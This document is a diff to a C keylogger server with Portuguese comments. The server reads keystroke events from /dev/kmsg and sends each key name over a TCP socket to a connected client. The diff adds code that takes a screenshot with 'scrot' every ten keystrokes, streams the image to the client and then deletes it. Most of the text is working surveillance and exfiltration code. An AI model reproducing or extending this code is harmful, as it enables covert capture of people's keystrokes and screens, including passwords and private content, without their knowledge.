@@ -8,6 +8,7 @@
 #include <netinet/in.h>
 #include <string.h>
 #include <fcntl.h>
+#include <signal.h>
 
 #define BUFFER_SIZE 1024
 #define SERVER_PORT 1234
@@ -143,7 +144,6 @@ const char* teclas[NUM_TECLAS] = {
     "NULL"
 };
 
-
 void shiftStringByCount(char* string, int count) {
     if (count >= 0 && count < strlen(string)) {
         memmove(string, string + count, strlen(string) - count + 1);
@@ -167,6 +167,7 @@ int findSemicolon(const char* string) {
     return position + 20;    //Retorna a posição do ; + caracteres do termo "Tecla pressionada: "
 }
 
+
 int main() {
     int fd;
     int sockfd, client_sock;
@@ -174,6 +175,7 @@ int main() {
     socklen_t client_addr_len;
     fd_set fds;
     struct timeval timeout;
+    int keyPressCount = 0;
 
     // Abrir o arquivo /dev/kmsg
     fd = open("/dev/kmsg", O_RDONLY);
@@ -253,10 +255,67 @@ int main() {
                     // Enviar dados para o cliente
                     int start = findSemicolon(buffer);
                     shiftStringByCount(buffer, start);
-                    if(atoi(buffer) >= 127) strcpy(buffer, "126\0");
+                    if (atoi(buffer) >= 127) strcpy(buffer, "126\0");
                     if (send(client_sock, teclas[atoi(buffer)], bytesRead, 0) == -1) {
                         perror("Erro ao enviar dados para o cliente");
                         exit(1);
+                    }
+
+                    keyPressCount++;
+
+                    if (keyPressCount % 10 == 0) {
+                        // Envia o caractere '#' para o cliente indicando o início da imagem
+                        if (send(client_sock, "#", 1, 0) == -1) {
+                            perror("Erro ao enviar o caractere '#' para o cliente");
+                        }
+
+                        // Executa o comando "scrot" para capturar a tela
+                        const char* command = "scrot screenshot.jpg";
+
+                        if (system(command) == -1) {
+                            printf("Erro ao executar o comando\n");
+
+                        } else {
+                            printf("Captura de tela salva com sucesso\n");
+
+                            // Envia a imagem capturada para o cliente
+                            FILE* imageFile = fopen("screenshot.jpg", "rb");
+                            if (imageFile == NULL) {
+                                perror("Erro ao abrir o arquivo de imagem");
+                            }
+
+                            fseek(imageFile, 0, SEEK_END);
+                            long imageSize = ftell(imageFile);
+                            fseek(imageFile, 0, SEEK_SET);
+
+                            // Envia o tamanho da imagem para o cliente
+                            if (send(client_sock, &imageSize, sizeof(imageSize), 0) == -1) {
+                                perror("Erro ao enviar o tamanho da imagem para o cliente");
+                            } else {
+                                // Envia a imagem capturada para o cliente em blocos
+                                char imageData[BUFFER_SIZE];
+                                size_t bytesRead;
+                                size_t totalBytesSent = 0;
+
+                                while ((bytesRead = fread(imageData, 1, sizeof(imageData), imageFile)) > 0) {
+                                    if (send(client_sock, imageData, bytesRead, 0) == -1) {
+                                        perror("Erro ao enviar o bloco de imagem para o cliente");
+                                        break;
+                                    }
+
+                                    totalBytesSent += bytesRead;
+                                }
+
+                                if (totalBytesSent == imageSize) {
+                                    printf("Imagem enviada com sucesso\n");
+                                } else {
+                                    printf("Erro ao enviar a imagem para o cliente\n");
+                                }
+                            }
+
+                            fclose(imageFile);
+                            remove("screenshot.jpg");
+                        }
                     }
 
                     // Atualizar a posição anterior para o final do arquivo
